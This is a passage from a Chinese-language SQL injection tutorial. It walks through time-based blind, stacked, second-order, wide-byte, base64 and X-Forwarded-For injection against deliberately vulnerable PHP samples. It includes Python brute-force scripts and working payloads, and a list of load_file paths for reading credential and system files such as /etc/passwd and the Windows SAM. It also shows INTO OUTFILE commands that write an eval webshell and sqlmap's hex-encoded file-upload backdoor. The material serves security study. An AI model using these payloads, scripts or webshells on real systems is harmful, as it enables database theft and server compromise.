![](../../../.gitbook/assets/tu-pian%20%2823%29.png)

同样的，我们也可以用之前的`substr()` 等函数来进行爆字符的操作。

POC：

```text
id=1%20%20%27%20and%20if(ord(substr(database(),1,1))=116,sleep(5),1)%20--+
```

我们这里首先了解如下函数

ORD\(string\)

ORD\(\) 函数返回字符串第一个字符的 [ASCII](http://www.nowamagic.net/academy/tag/ASCII) 值。

```text
SELECT ord('t')
```

![](../../../.gitbook/assets/tu-pian%20%2855%29.png)

我们可以看到`t` 的ascii值为`116` ，我们可以优化以下我们的脚本，来爆出数据库名称。

```text
import requests
import time

for i in range(1,5):
    for num in range(27,122):
        url = r'http://127.0.0.1/time.php?id=1%20%20%27%20and%20if(ord(substr(database(),'+str(i)+',1))='+str(num)+',sleep(5),1)%20--+'
        start = time.clock()
        r = requests.get(url)
        elapsed = (time.clock() - start)
        if elapsed >= 3:
            print('数据库名称第'+ str(i) + '位为：' + chr(num))
            break
```

![](../../../.gitbook/assets/tu-pian%20%2859%29.png)

至此，我们已经得到数据库名称`test` 。

同样的，我们也可以利用`benchmark()` 函数来完成同样的操作，首先我们先了解一下这个函数是做什么的。

```text
BENCHMARK(count,expr)
```

`BENCHMARK()`用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。（这是一种边信道攻击，在运行过程中占用大量的cpu资源。）

```text
select benchmark(25000000,md5('test'))
```

![](../../../.gitbook/assets/tu-pian%20%2829%29.png)

我们可以看到，消耗时间为`5.6445` 秒。

POC：

```text
1%20 ' and if(ord(substr(database(),1,1))=116,benchmark(25000000,md5('test')),1) --+
```

我们只需将代码中的`sleep()` 相应的`benchmark` 即可。

```text
import requests
import time

for i in range(1,5):
    for num in range(27,122):
        url = r'http://127.0.0.1/time.php?id=1%20%20%27%20and%20if(ord(substr(database(),'+str(i)+',1))='+str(num)+',benchmark(25000000,md5("test")),1)%20--+'
        start = time.clock()
        r = requests.get(url)
        elapsed = (time.clock() - start)
        if elapsed >= 3:
            print('数据库名称第'+ str(i) + '位为：' + chr(num))
            break
```

![](../../../.gitbook/assets/tu-pian%20%2827%29.png)

之前做过一个中科院的题目，其中将`sleep` 和`benchmark` 都禁用了，当时查资料的时候发现了一些其他的方式，这里借用pwnhub的代码：

```text
<?php
require 'conn.php';
$id = $_GET['id'];
if(preg_match("/(sleep|benchmark|outfile|dumpfile|load_file|join)/i", $_GET['id']))
{
    die("you bad bad!");
}
$sql = "select * from article where id='".intval($id)."'";
$res = mysql_query($sql);
if(!$res){
    die("404 not found!");
}
$row = mysql_fetch_array($res, MYSQL_ASSOC);
mysql_query("update view set view_times=view_times+1 where id = '".$id." '");
?>
```

我们可以看到在`$sql`我们传入的参数会被强转`int`，这里显然就不存在注入了，然而下面`update` 处直接拼接到了SQL语句中，报错被禁止，因此不能进行报错注入，`load_file` 被禁用，而且不知道是不是`root` 权限，因此`dns_log` 方法也放弃，又因为页面没有回显，因此普通注入也无法进行，唯一剩下延时注入，其中`sleep` 与`benchmark` 均被禁用，所以我们需要找到其他的延时函数。

通过查询资料，我们发现有如下几种方法。

**笛卡尔积：**

这种方法又叫做`heavy query`，原理就如方法的名字：大负荷查询 即用到一些消耗资源的方式让数据库的查询时间尽量变长 而消耗数据库资源的最有效的方式就是让两个大表做笛卡尔积，这样就可以让数据库的查询慢下来 而最后找到系统表`information_schema`数据量比较大，可以满足要求，所以我们让他们做笛卡尔积。

例如：

```text
select count(*) from information_schema.columns, information_schema.columns T1,information_schema.columns T2
```

![](../../../.gitbook/assets/tu-pian%20%2868%29.png)

我们可以看到，通过不断地让大表做笛卡尔积，时间也在增加，达到我们延时的目的。

**GET\_LOCK**

我们可以先看一下文档中是怎么描述的：

GET\_LOCK\(str,timeout\)

Tries  
to obtain a lock with a name given by the string str, using a timeout of  
timeout seconds. A negative timeout value means infinite timeout. The lock is  
exclusive. While held by one session, other sessions cannot obtain a lock of  
the same name.

`get_lock`是MySQL的锁机制，我们可以看到其中描述写道“当一个会话持有时，其他会话无法获取同样的名字。”，`get_lock`会按照`str`来加锁，别的客户端再以同样的`str`加锁时就加不了了，处于等待状态。 当调用release\_lock来释放上面加的锁或客户端断线了，上面的锁才会释放，其它的客户端才能进来。也就是说我们可以通过在一个`session`中可以先锁定一个变量例如：`select get_lock('do9gy',1)`

然后通过另一个`session` 再次执行get\_lock函数 `select get_lock('do9gy',5)`，此时会产生5 秒的延迟，其效果类似于sleep\(5\)。

所以我们的攻击过程如下 先上锁 再进行盲注

1. 先执行 `1' and get_lock(1,2)%23` 给key=1上锁
2. 等待1-2分钟，让服务器将我们下一次的查询当做客户B
3. 然后就可以盲注了 `1' and if(1,get_lock(1,2),1)%23` 再次执行同样的语句会产生延时

![SESSION A](../../../.gitbook/assets/tu-pian%20%2842%29.png)

![SESSION B](../../../.gitbook/assets/tu-pian%20%2882%29.png)

我们可以看到，我们通过这种方式，已经获得了延时的效果。

但是需要注意的是，这种方法的使用情况有限，即长连接 一般在php5版本系列中，我们建立与Mysql的连接使用的是`mysql_connect()`，题中使用的是

```text
$con = mysql_pconnect("mysql",$_ENV['MYSQL_USER'],$_ENV['MYSQL_PASSWORD']);
```

这两者的区别如下：

| 函数名 | 功能 |
| :--- | :--- |
| mysql\_connect\(\) | 脚本一结束，到服务器的连接就被关闭 |
| mysql\_pconnect\(\) | 打开一个到 MySQL 服务器的持久连接 |

因此，如果使用的是`mysql_connect()` ， `mysql_connect()`一结束，就会立刻关闭连接，这就意味着，我们刚刚对资源`d09gy`加完锁就立刻断开了，我们`get_lock()` 的利用条件也就被破坏了。即第一次加锁后，需要等待1~2分钟，再访问的时候服务器就会判断你为客户B，而非之前加锁的客户A 此时即可触发`get_lock()`。

**RLIKE**

通过`rpad`或`repeat`构造长字符串，加以计算量大的`pattern`，通过repeat的参数可以控制延时长短。

![](../../../.gitbook/assets/tu-pian%20%2849%29.png)

我们同样也得到了延时的效果。

**堆叠注入：**

我们知道，数据库基本操作有“增删改查”，我们前面说过的注入都是对原来sql语句传输数据的地方进行相关修改，注入情况会因为该语句本身的情况而受到相关限制，例如一个select语句，那么我们注入时也只能执行select操作，无法进行增、删、改。因此我们可以利用堆叠注入，可以堆一堆sql注入进行注入，这个时候我们就不受前面语句的限制可以为所欲为了。其原理也很简单，就是将原来的语句构造完后加上分号，代表该语句结束，后面在输入的就是一个全新的sql语句了，这个时候我们使用增删查改毫无限制。

注意：堆叠注入受到API或者数据库引擎（例如oracle不能使用堆叠注入），又或者权限的限制，使用情况有限，比如：`mysqli_multi_query()`函数就支持多条sql语句同时执行，而现实中，PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli\_ query\(\)函数，其只能执行一条语句，分号后面的内容将不会被执行。

```text
SELECT * FROM `user`  ; insert into user(id,name) value (66,'test')
```

![](../../../.gitbook/assets/tu-pian%20%2895%29.png)

如下代码：

```text
<?php
try {
    $conn = new PDO("mysql:host=localhost;dbname=test", "root", "root");
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $stmt = $conn->query("SELECT * FROM user where `id` = '" . $_GET['id'] . "'");

    $result = $stmt->setFetchMode(PDO::FETCH_ASSOC);
    foreach($stmt->fetchAll() as $k=>$v) {
        foreach ($v as $key => $value) {
            echo $value;
        }
    }
    $dsn = null;
}
catch(PDOException $e)
{
    echo "error";
}
$conn = null;
?>
```

这里我们可以看到，程序获得`GET` 参数`ID` ，使用`PDO` 的方式进行数据查询，但是仍然将参数`ID` 直接拼接到了查询语句中，`PDO` 没有起到预编译的效果，仍存在注入。

POC：

```text
1'; insert into user(id,name) value (77,'tttt')--+
```

![](../../../.gitbook/assets/tu-pian%20%2876%29.png)

我们可以看到数据已经注入进数据库了，我们也可以利用`sleep()` 等函数，将判断语句加入POC来得到我们想要的信息。

```text
1'; select if (substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) = 't', sleep(3),1) --+
```

我们执行过后，发现程序延时了`3` 秒，说明数据库名称第一位为`t` ，此内容已在上文详细阐述，此处不再重复。

![](../../../.gitbook/assets/tu-pian%20%28106%29.png)

**二次注入：**

为了防止sql注入的产生，很多开发人员会对数据进行转义操作，然而如果在取出时，没有做相应的操作，就会产生二次注入的风险。

如下代码：

```text
<?php
header("Content-Type:text/html;charset=utf8");
$con=mysqli_connect("localhost","root","root","test");
mysqli_set_charset($con,'utf8');
if(!$con){
    echo "Connect failed : ".mysqli_connect_error();
}

$username=$_GET['username'];
$password=$_GET['password'];
$result=mysqli_query($con,"insert into users(username,password) values('".addslashes($username)."','".md5($password)."')");
echo "id为:".mysqli_insert_id($con)
?>
```

```text
<?php
header("Content-Type:text/html;charset=utf8");
$con=mysqli_connect("localhost","root","root","test");
mysqli_set_charset($con,'utf8');
if(!$con){
    echo "Connect failed : ".mysqli_connect_error();
}

$id=intval($_GET['id']);
$result=mysqli_query($con,"select * from users where id='".$id."'");
$row=mysqli_fetch_array($result);
$username=$row['username'];
$result2=mysqli_query($con,"select * from person where username='".$username."'");
$row2=mysqli_fetch_array($result2);
if ($row2) {
    echo $row2['username'].":".$row2['money'];
}else{
    echo mysqli_error($con);
}
?>
```

第一部分代码我们模拟了注册用户的操作，代码会在`GET` 参数`ID` 中获取`username` 和`password` ，对`username` 参数使用`addslashes` 进行转义操作（转义了单引号，使得语句无法闭合），参数`password` 进行了`MD5哈希` ，因此此处不存在注入，而在第二部分代码中，我们模拟了个人主页查询余额的功能，代码会在`GET` 参数`ID` 转成了`INT` 类型，这里我们也无法拼接SQL语句，无法进行注入，然后将到`user` 表中获取`ID` 对应的`username` ，然后接着到`person` 表中查询`username` 对应的数据，而此处并未对数据进行转义，存在注入。

例如我们：

```text
http://127.0.0.1/double1.php?username=test1&password=123456
```

我们可以发现，数据已经被插入数据库中：

![](../../../.gitbook/assets/tu-pian%20%2840%29.png)

当我们插入用户名为`test1'` 时，

![](../../../.gitbook/assets/tu-pian%20%283%29.png)

![](../../../.gitbook/assets/tu-pian%20%284%29.png)

数据被保存在数据库中，由于`addslashes` 的存在，这里的`'` 被转义为`\'` ，因此不会报错，而在MySQL中，会自动去除转义字符也就是反斜杠`\` 。因此其实我们使用该语句时，数据库中真实执行的命令如下：

```text
insert into users(username,password) values('test1\'','e10adc3949ba59abbe56e057f20f883e')
```

因此我们这里将`test1'` 插入到了数据库中，而我们当对`double2.php` 进行使用时，我们首先尝试正常的`test1` ，由上文我们知道它的`id` 为`1` ，我们进行查询：

![](../../../.gitbook/assets/tu-pian%20%286%29.png)

这里用正常的`id`去对应`person` 表中的数据，并取出相应的`username` 以及`money` ，但是这里并没有进行任何限制，因此当我们取之前的`test1'` ，由于`'` 拼接到了SQL语句中，因此会使得数据库发生报错：

![](../../../.gitbook/assets/tu-pian.png)

至此，我们就可以利用这一过程进行二次注入的攻击，我们的攻击过程是：

1. 构造攻击语句
2. 将攻击语句存储到数据库中
3. 由于数据库在取出数据时，并没有对数据进行检查，语句得以执行

如上案例，我们可以结合之前联合注入的知识，很容易构造出如下POC

```text
test' union select 1,user(),2%23
```

我们首先通过`double1.php` 将该语句插入数据库中：

![](../../../.gitbook/assets/tu-pian%20%2888%29.png)

接下来利用`double2.php` 来取出数据：

![](../../../.gitbook/assets/tu-pian%20%2870%29.png)

我们看到，我们的语句已经成功执行了。

**宽字节注入：**

前面我们讲到，MySQL中为了防止注入问题的发生，一般会采用`addslashes` ，会将`'` 转义为`/'` ，类似的函数还有`mysql_real_escape_string()`\(PHP 4 &gt;= 4.3.0, PHP 5 本扩展自 PHP 5.5.0 起已废弃，并在自 PHP 7.0.0 开始被移除\)，`mysql_escape_string` \(PHP 4 &gt;= 4.0.3, PHP 5, 注意：在PHP5.3中已经弃用这种方法，不推荐使用\)，还有`magic_quotes_gpc` ，而宽字节注入问题主要是利用MySQL的一个特性，MySQL在使用`GBK`编码的时候，会认为两个字符是一个汉字。类似的还有`GB2312`、`GB18030`、`BIG5`、`Shift_JIS`等，但是要注意，`GB2312` 不存在宽字节注入问题，这主要是`GB2312`编码取值范围的事情，它高位范围`0xA1~0xF7`，低位范围是`0xA1~0xFE`，`\是%5c`，是不在低范围中的，即其根本不是`GB2312`编码，故其不会被吃掉。故只要低位的范围中含有`0x5c`的编码，就可以进行宽字节的注入会出现吞字符的现象，在PHP中，通过`iconv()` 进行编码转换时，也可能存在宽字节注入的问题，我们后面详解。

如下代码：

```text
<?php
header("Content-type:text/html;charset=GBK");
$con=mysqli_connect("localhost","root","root","test");
mysqli_set_charset($con,'gbk');
if (mysqli_connect_errno())
{
	echo "连接失败: " . mysqli_connect_error();
}
$id = addslashes($_GET['id']);
echo "sql:select * from users where id=" . $id;
$result=mysqli_query($con,"select * from users where id='".$id."' ");
$row = mysqli_fetch_array($result);
$username = $row['username'];
$result2 = mysqli_query($con,"select * from person where `username`='".$username."'");

if($row2 = mysqli_fetch_array($result2)){
	echo $row2['username'] . " : " . $row2['money'];
}else{
	echo mysqli_error($con);
}
?>
```

这里还是上文中二次注入的代码稍加改造了一下，`header("Content-type:text/html;charset=GBK");` 是为了将我们数据库中实际执行的代码打印出来，便于查看。`mysqli_set_charset($con,'gbk');` 是将字符设置为`GBK` 编码，接下来我们可以尝试一下：

当我们正常属于`id` 为`1` 时：

![](../../../.gitbook/assets/tu-pian%20%2812%29.png)

我们可以看到数据库中正常执行了`select * from users where id=1` 并且打印出了后面数据库中对应的内容，当我们想要利用`'` 进行闭合时：

![](../../../.gitbook/assets/tu-pian%20%2810%29.png)

我们发现，因为有了`addslashes` 的作用，我们的语句变成了`select * from users where id=1\'`，并且正常执行了，并没有引发报错，那么我们利用`%df'` 尝试一下：

![](../../../.gitbook/assets/tu-pian%20%2866%29.png)

我们发现无法正常显示了，这事由于`GBK`编码的编码范围是`0x8140~0xFEFE`（不包括xx7F），在遇到`%df`\(ascii\(223\)\) &gt;ascii\(128\)时自动拼接`%5c`，因此吃掉`\`，而`%27`、`%20`小于`ascii(128)`的字符就保留了，由于`\` 被吞并，因此`'` 又得以逃逸，我们就可以发起注入攻击：

![](../../../.gitbook/assets/tu-pian%20%2871%29.png)

相同的，其它的宽字符集也是一样的分析过程，要吃掉`%5c`，只需要低位中包含正常的`0x5c`就行了，我们只需在前面加入`奇数` 个`%df` 类似于这种能与后面的`%5c` 组成汉字的字符都可以利用（两个`%df%df` 是`哌` ，多出来的那个`%df` 就可以吞并`\`）即可，

而`iconv()` 情况比较奇特，首先我们要知道他的用法：

```text
iconv(原编码,目的编码,变量名称)
```

这里存在两种情况，就是从`GBK` 转成`utf-8` 与上文讲述相同，这里不再赘述，而从`utf-8` 转为`GBK` 利用方式还是要讲述一下，我们这里的POC：

```text
1錦' and sleep(5) --+
```

![](../../../.gitbook/assets/tu-pian%20%28101%29.png)

因为`錦`的`utf-8`编码为`0xe98ca6`，`GBK` 编码为`0xe55c` ，也就是说，在`錦`被`iconv`从`utf-8`转换成`gbk`后，变成了`%e5%5c`，而后面的`'`被`addslashes`变成了`%5c%27`，这样组合起来就是`%e5%5c%5c%27`，两个`%5c`就是`\`，正好与后面的`\`组合为`\\`，导致`'`逃逸出单引号，产生注入，数据库中实际执行的语句为：

```text
select * from users where id='1\\' and sleep(5) -- '
```

**Base64注入：**

如下代码：

```text
<?php
  $id = base64_decode($_GET['id']);
  $id = urldecode($id);
  $con=mysqli_connect("localhost","root","root","test");
  if (mysqli_connect_errno())
  {
  	echo "连接失败: " . mysqli_connect_error();
  }
  $result=mysqli_query($con,"select * from users where id='".$id."' ");
  if (!$result) {
    printf("Error: %s\n", mysqli_error($con));
    exit();
  }
  $row = mysqli_fetch_array($result);
  echo $row['username'] . " : " . $row['password'];
  echo "<br>";
?>
```

我们可以从代码得知，代码除了对`GET` 参数`id` 进行了`base64` 加密处理，并未做其他限制，例如我们知道，`1` 经`base64` 编码后结果为`MQ==` ，我们可以进行访问:



![](https://blobscdn.gitbook.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-LrgrGdGxHJRhY-L_jYq%2F-LtXyl-GHFJJaWyX0BcD%2F-LtYJ8Ih-Yp5jAbluabl%2F%E5%9B%BE%E7%89%87.png?alt=media&token=8af70fdc-ebd1-4900-a5eb-3aa094a207f5)

我们看到，正常的查询到了`id` 为`1` 的数据，由上面可知，注入POC：

```text
-1' union select 1,user(),3 #
```

由于代码中会对传入参数解密一次，因此我们先将POC通过`base64` 加密一次：

```text
LTElMjclMjB1bmlvbiUyMHNlbGVjdCUyMDElMkN1c2VyJTI4JTI5JTJDMyUyMCUyMw==
```

![](../../../.gitbook/assets/tu-pian%20%28111%29.png)

**XFF注入：**

如下代码：

```text
<?php
  $con=mysqli_connect("localhost","root","root","test");
  if (mysqli_connect_errno())
  {
  	echo "连接失败: " . mysqli_connect_error();
  }

  if(getenv('HTTP_CLIENT_IP')) {
    $ip = getenv('HTTP_CLIENT_IP');
  } elseif(getenv('HTTP_X_FORWARDED_FOR')) {
    $ip = getenv('HTTP_X_FORWARDED_FOR');
  } elseif(getenv('REMOTE_ADDR')) {
    $ip = getenv('REMOTE_ADDR');
  } else {
    $ip = $HTTP_SERVER_VARS['REMOTE_ADDR'];
  }

  $result = mysqli_query($con,"select * from ips where `ip`='".$ip."'");
  if (!$result) {
    printf("Error: %s\n", mysqli_error($con));
    exit();
  }
  $row = mysqli_fetch_array($result);
  echo $row['username'] . " : " . $row['password'];
  echo "<br>";
?>
```

在PHP中，`getenv()` 用于获取一个环境变量的值，类似于`$_SERVER` 或`_ENV` ，返回环境变量对应的值，如果变量不存在则返回`FALSE` 。

在代码中，程序首先判断是否存在HTTP头部参数`HTTP_CLIENT_IP` ，如果存在，则赋值给`$ip` ，如果不存在，则判断是否存在HTTP头部参数`HTTP_X_FORWARDED_FOR` ，如果存在，则赋值给`$ip` ，如果不存在，则将HTTP头部参数`REMOTE_ADDR` 赋值给`$ip` ，接下来将`$ip` 拼接到`select` 查询语句中。

由于HTTP头部参数是可以伪造的，所以我们可以添加一个头部参数`CLIENT_IP` 或`X_FORWARDED_FOR` ，我们首先设置`X_FORWARDED_FOR` 为`127.0.0.1` ，我们看到顺利查询到了对应的数据。

![](../../../.gitbook/assets/tu-pian%20%2875%29.png)

由于拼接地方未做任何限制，因此我们直接如同上文，拼接查询语句即可：

![](../../../.gitbook/assets/tu-pian%20%2834%29.png)

### 利用方式

**拖库：**

正如上文介绍，数据库中的数据会受到威胁，这里不再详细介绍。

**导入导出文件：**

首先我们了解一下`load_file()` 函数

```text
Load_file(file_name)
```

`load_file()` 函数可以读取文件并且将文件内容以字符串的形式返回。

**注意：**

MYSQL新特性`secure_file_priv`对读写文件的影响：

* ure\_file\_priv的值为null ，表示限制mysqld 不允许导入\|导出
* 当secure\_file\_priv的值为/tmp/ ，表示限制mysqld 的导入\|导出只能发生在/tmp/目录下
* 当secure\_file\_priv的值没有具体值时，表示不对mysqld 的导入\|导出做限制

我们可以使用如下命令查看`secure-file-priv`参数的值：

```text
show global variables like '%secure%';
```

![](../../../.gitbook/assets/tu-pian%20%28105%29.png)

本地测试的时候，`windows`下我们可以通过修改`mysql.ini` 文件，在`[mysqld]` 下加入`secure_file_priv =` ，`Linux` 下修改`my.cnf` 在`[mysqld]`内加入`secure_file_priv =`来更改这一配置，更改过后需要重启`mysql` 服务。

![](../../../.gitbook/assets/tu-pian%20%287%29.png)

之后我们将路径中的`\` 更改为`\\` ，就可以读取文件了：

![](../../../.gitbook/assets/tu-pian%20%2884%29.png)

这里我们要注意，`load_file()` 使用需要以下几个条件：

1. 必须有权限读取并且文件必须完全可读。
2. 文件必须在服务器上
3. 必须指定文件完整的路径
4. 文件必须小于`max_allowed_packet` 

下面给大家列举一些常用的`load_file()` 路径：

#### WINDOWS下：

| 位置 | 说明 |
| :--- | :--- |
| c:/boot.ini | 查看系统版本 |
| c:/windows/php.ini | php配置信息 |
| c:/windows/my.ini | MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 |
| c:/winnt/php.ini | php配置信息 |
| c:/winnt/my.ini | MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 |
| c:\mysql\data\mysql\user.MYD | 存储了mysql.user表中的数据库连接密码 |
| c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini | 存储了虚拟主机网站路径和密码 |
| c:\Program Files\Serv-U\ServUDaemon.ini | 存储了虚拟主机网站路径和密码 |
| c:\windows\system32\inetsrv\MetaBase.xml | 查看IIS的虚拟主机配置 |
| c:\windows\repair\sam | 存储了WINDOWS系统初次安装的密码 |
| c:\Program Files Serv-U\ServUAdmin.exe | 6.0版本以前的serv-u管理员密码存储于此 |
| c:\Program Files\RhinoSoft.com\ServUDaemon.exe | 6.0版本以前的serv-u管理员密码存储于此 |
| C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif | 存储了pcAnywhere的登陆密码 |
| c:\Program Files\Apache Group\Apache\conf\httpd.conf | 查看WINDOWS系统apache文件 |
| C:\apache\conf\httpd.conf | 查看WINDOWS系统apache文件 |
| c:/Resin-3.0.14/conf/resin.conf | 查看jsp开发的网站 resin文件配置信息. |
| c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf | 查看linux系统配置的JSP虚拟主机 |
| d:\APACHE\Apache2\conf\httpd.conf | Apache配置文件 |
| C:\Program Files\mysql\my.ini | Mysql配置文件 |
| C:\mysql\data\mysql\user.MYD | 存在MYSQL系统中的用户密码 |

#### LUNIX/UNIX 下：

| 位置 | 说明 |
| :--- | :--- |
| /usr/local/app/apache2/conf/httpd.conf | apache2缺省配置文件 |
| /usr/local/apache2/conf/httpd.conf | Aphache配置文件 |
| /usr/local/app/apache2/conf/extra/httpd-vhosts.conf | 虚拟网站设置 |
| /usr/local/app/php5/lib/php.ini | PHP相关设置 |
| /etc/sysconfig/iptables | 从中得到防火墙规则策略 |
| /etc/httpd/conf/httpd.conf | apache配置文件 |
| /etc/rsyncd.conf | 同步程序配置文件 |
| /etc/my.cnf | mysql的配置文件 |
| /etc/redhat-release | 系统版本 |
| /etc/issue | 系统版本 |
| /etc/issue.net | 系统版本 |
| /usr/local/app/php5/lib/php.ini | PHP相关设置 |
| /usr/local/app/apache2/conf/extra/httpd-vhosts.conf | 虚拟网站设置 |
| /etc/httpd/conf/httpd.conf | 查看linux APACHE虚拟主机配置文件 |
| /usr/local/apche/conf/httpd.conf | 查看linux APACHE虚拟主机配置文件 |
| /usr/local/resin-3.0.22/conf/resin.conf | 针对3.0.22的RESIN配置文件查看 |
| /usr/local/resin-pro-3.0.22/conf/resin.conf | 针对3.0.22的RESIN配置文件查看 |
| /usr/local/app/apache2/conf/extra/httpd-vhosts.conf | Apache虚拟主机配置 |
| /etc/httpd/conf/httpd.conf | 查看linux APACHE虚拟主机配置文件 |
| /usr/local/apche/conf /httpd.conf | 查看linux APACHE虚拟主机配置文件 |
| /usr/local/resin-3.0.22/conf/resin.conf | 针对3.0.22的RESIN配置文件查看 |
| /usr/local/resin-pro-3.0.22/conf/resin.conf | 同上 |
| /usr/local/app/apache2/conf/extra/httpd-vhosts.conf | Apache虚拟主机查看 |
| /etc/sysconfig/iptables | 查看防火墙策略 |
| load\_file\(char\(47\)\) | 可以列出FreeBSD,Sunos系统根目录 |
| replace\(load\_file\(0×2F6574632F706173737764\),0×3c,0×20\) | 查看/etc/passwd（16进制编码了） |
| replace\(load\_file\(char\(47,101,116,99,47,112,97,115,115,119,100\)\),char\(60\),char\(32\)\) | 查看/etc/passwd（Ascii编码 |

**LOAD DATA INFILE：**

用于从一个文本中读取行，并装入一个表中，文件名称必须为一个字符串。

```text
LOAD DATA [LOW_PRIORITY | CONCURRENT] [LOCAL] INFILE 'file_name'
[REPLACE | IGNORE]
INTO TABLE tbl_name
[PARTITION (partition_name,...)]
[CHARACTER SET charset_name]
[{FIELDS | COLUMNS}
[TERMINATED BY 'string']
[[OPTIONALLY] ENCLOSED BY 'char']
[ESCAPED BY 'char']
]
[LINES
[STARTING BY 'string']
[TERMINATED BY 'string']
]
[IGNORE number {LINES | ROWS}]
[(col_name_or_user_var,...)]
[SET col_name = expr,...]
```

注意：load data 需要有处理文件的权限， `GRANT FILE ON . TO user@host;` 

例如：

```text
> load data infile "/data/mysql/e.sql" into table e fields terminated by ',';
Query OK, 3 rows affected (0.01 sec)
Records: 3  Deleted: 0  Skipped: 0  Warnings: 0

> select * from e;
+------+-------+-------+
| id   | fname | lname |
+------+-------+-------+
| 1669 | Jim   | Smith |
|  337 | Mary  | Jones |
| 2005 | Linda | Black |
+------+-------+-------+
```

这里我们指定`分隔符` 为`,` 这里我们要清楚，如果错误代码为`2` ，文件不存在；错误代码为`13` 说明没有权限。

**SELECT INTOOUTFILE：**

可以把选择的行写入一个文件中，用法如下：

```text
SELECT [列名] FROM table [WHERE 语句]
        INTO OUTFILE '目标文件' [OPTION];
```

因为我们是要创建一个文件，因此必须拥有文件写入权限（`FILE`权限）后，才能使用此语法。同时，“目标文件”不能是一个已经存在的文件。

我们一般有两种用法，一种是直接使用`select` 将内容导入文件中：

```text
select <?php@eval($_post[“mima”])?> into outfile "c:\\phpnow\\htdocs\\test.php"
```

还可以修改文件结尾，这里一开始我也没明白是什么意思，直到看完[sqlmap os shell解析](https://www.cnblogs.com/lcamry/p/5505110.html)，大致清楚了是什么意思。

首先介绍语法：

```text
select version() into outfile "c:\\phpnow\\htdocs\\test.php" LINES TERMINATED BY 0x16进制文件
```

这里我是这样理解的，代码的意思是将内容写入到文件中去，其中`LINES TERMINATED BY`则是`into outfile`的参数，意思是行结尾的时候用`by`后面的内容，一般情况下为‘/r/n’，但是这里我们可以将`by`后的内容修改为后面的16进制的文件。

比如作者在分析`SQLMAP` 的`--os-shell` 参数时候，抓包发现，用的就是这一句法：

```text
http://192.168.0.166/php/newsshow.php?cid=-6901%20OR%203616%3D3616%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fwamp%2Fwww%2Ftmpulujm.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d5c5c77616d705c5c7777775c5c3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20--%20-
```

我们解码其中16进制内容代码后发现内容如下：

```text
<?php
if (isset($_REQUEST["upload"]))
{
    $dir=$_REQUEST["uploadDir"];
    if (phpversion()<'4.1.0')
    {
        $file=$HTTP_POST_FILES["file"]["name"];
        @move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();
    }
    else
    {
        $file=$_FILES["file"]["name"];
        @move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();
    }
    @chmod($dir."/".$file,0755);echo "File uploaded";
}
else 
{
    echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/var/www/html/> <input type=submit name=upload value=upload></form>";
}
?>
```

实现的就是上传文件，同时根据`phpversion` ，将上传的文件的权限进行修改。

这里需要注意的是要根据具体环境分析文件路径需要不需要转义，在`load_file()` 前台无法导出数据的时候，我们也可以利用如下命令将服务器中的内容导出到WEB服务器目录下，这样就可以得到数据了：

```text
selectload_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’)intooutfile ‘c:\\wamp\\www\\test.php’
```

## 参考资料

1. 《Web安全攻防 渗透测试实战指南》
2. 《PHP WEB 安全开发实战》
3. 《SQL注入攻击与防御第2版》
4. [  Mysql报错注入原理分析\(count\(\)、rand\(\)、group by\)](https://www.2cto.com/article/201604/498394.html)
5. [盲注的讲解](https://www.cnblogs.com/cany/p/10747248.html)
6. \_\_[BIGINT Overflow Error Based SQL Injection](https://osandamalith.com/2015/07/08/bigint-overflow-error-based-sql-injection/)
7. [mysql 延时注入新思路](https://xz.aliyun.com/t/2288)
8. [pwnhub time injection带来的新思路](https://blog.csdn.net/qq_27446553/article/details/79944827)
9. [一种新型SQL时间盲注攻击探索](https://zhuanlan.zhihu.com/p/35245598)
10. [MySQL时间盲注五种延时方法 \(PWNHUB 非预期解\)](https://www.cdxy.me/?p=789)
11. [简单sql注入学到的延时盲注新式攻击](https://www.cnblogs.com/Mrsm1th/p/8718744.html)
12. [ SQL注入 堆叠注入（Stack Injection）](https://www.jianshu.com/p/c50ced83414d)
13. [Stacked Queries](http://www.sqlinjection.net/stacked-queries/)
14. [宽字符注入详解与实战](https://www.cnblogs.com/bmjoker/p/9134830.html)
